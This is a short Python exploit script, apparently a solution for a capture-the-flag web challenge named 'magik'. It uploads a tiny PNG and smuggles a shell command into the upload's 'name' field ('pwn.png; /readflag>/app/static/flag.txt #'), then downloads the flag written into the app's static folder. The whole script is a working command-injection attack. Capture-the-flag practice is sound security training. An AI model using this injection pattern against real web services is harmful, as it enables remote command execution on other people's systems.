import requests
import sys
url = sys.argv[1] if len(sys.argv) > 1 else 'https://aa1fadfd635d-magik.challs.m0lecon.it'
png = bytes.fromhex('89504e470d0a1a0a0000000d494844520000000100000001080200000090775300000006504c5445200000a2997607000000ff49454e44ae426082')
name = "pwn.png; /readflag>/app/static/flag.txt #"
files = {'img': ('tiny.png', png, 'image/png')}
data = {'name': name}
resp = requests.post(url, files=files, data=data, timeout=10)
print('[+] upload status', resp.status_code)
flag_resp = requests.get(f"{url}/static/flag.txt", timeout=10)
print('[+] flag fetch', flag_resp.status_code)
if flag_resp.status_code == 200:
    print(flag_resp.text)
else:
    print(flag_resp.text[:200])
